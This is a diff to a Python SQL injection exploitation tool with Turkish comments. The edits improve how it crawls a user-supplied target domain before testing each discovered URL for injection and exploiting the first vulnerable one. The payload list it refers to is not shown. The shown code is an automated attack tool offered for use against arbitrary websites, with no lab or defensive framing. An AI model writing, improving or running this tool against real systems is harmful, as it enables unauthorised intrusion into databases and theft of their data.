@@ -1,5 +1,5 @@
 import requests
-from urllib.parse import urlencode
+from urllib.parse import urljoin
 from bs4 import BeautifulSoup
 
 # Kullanılacak potansiyel tablo ve sütun isimleri
@@ -44,11 +44,12 @@ PAYLOADS = [
 # Otomatik hedef URL çıkarma fonksiyonu
 def discover_urls(domain):
     print("[*] URL'ler keşfediliyor...")
+    base_url = f"http://{domain}" if not domain.startswith("http") else domain
     try:
-        response = requests.get(domain, timeout=10)
+        response = requests.get(base_url, timeout=10)
         soup = BeautifulSoup(response.text, "html.parser")
-        links = [link.get('href') for link in soup.find_all('a', href=True)]
-        valid_urls = [url for url in links if url.startswith(domain) or url.startswith('/')]
+        links = [urljoin(base_url, link.get('href')) for link in soup.find_all('a', href=True)]
+        valid_urls = [url for url in links if base_url in url]
         print(f"[+] {len(valid_urls)} URL bulundu.")
         return valid_urls
     except Exception as e:
@@ -127,12 +128,11 @@ def extract_response(response_text):
 # Ana işlem
 if __name__ == "__main__":
     print("Gelişmiş SQL Injection Sömürme Aracı")
-    domain = input("Hedef Domain (ör. http://example.com): ")
+    domain = input("Hedef Domain (ör. site.com): ")
 
     urls = discover_urls(domain)
     for url in urls:
-        full_url = domain + url if url.startswith('/') else url
-        vulnerable_url = test_sql_injection(full_url)
+        vulnerable_url = test_sql_injection(url)
         if vulnerable_url:
             perform_sql_injection(vulnerable_url)
             break
